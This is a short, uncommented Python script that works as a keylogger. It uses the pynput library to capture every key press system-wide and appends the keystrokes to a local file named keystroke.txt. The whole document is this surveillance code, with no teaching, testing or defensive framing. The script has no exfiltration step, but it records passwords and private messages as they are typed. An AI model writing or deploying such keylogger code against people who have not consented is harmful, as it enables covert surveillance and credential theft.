from pynput.keyboard import Listener

def writefile(key):
    keystroke = str(key)
    keystroke = keystroke.replace("'","")
    if keystroke == "Key.space":
        keystroke = " "
    if keystroke == "Key.shift_r":
        keystroke = ""
    if keystroke == "Key.backspace":
        keystroke = ""
    if keystroke == "Key.enter":
        keystroke = "\n"
    if keystroke == "Key.ctrl_l":
        keystroke = ""
    with open("keystroke.txt", "a") as f:
        f.write(keystroke)
    

with Listener(on_press=writefile) as listen:
    listen.join()